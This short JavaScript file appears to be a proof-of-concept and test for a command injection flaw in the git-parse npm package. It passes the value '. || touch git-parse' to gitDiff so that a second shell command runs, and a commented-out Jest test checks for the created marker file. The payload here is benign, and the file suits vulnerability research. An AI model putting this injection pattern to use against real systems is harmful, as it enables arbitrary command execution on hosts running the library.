const x = require("git-parse");
const paths = ". || touch git-parse";
x.gitDiff(".", 445454, 1545, paths).finally(() => {});

// test("Command Injection in git-parse", () => {
//   expect.assertions(2);
//   const x = require("git-parse");
//   const fs = require("fs");
//   const path = "./git-parse";
//   try {
//     if (fs.existsSync(path)) {
//       fs.unlinkSync(path);
//       console.log("File removed:", path);
//     }
//   } catch (err) {
//     console.error(err);
//   }
//   file_exist = fs.existsSync(path);
//   expect(file_exist).toBe(false);
//   const paths = ". || touch git-parse";
//   return x.gitDiff(".", 445454, 1545, paths).finally(() => {
//     file_exist = fs.existsSync(path);
//     expect(file_exist).toBe(true);
//     fs.unlink(path, function (err) {});
//   });
// });
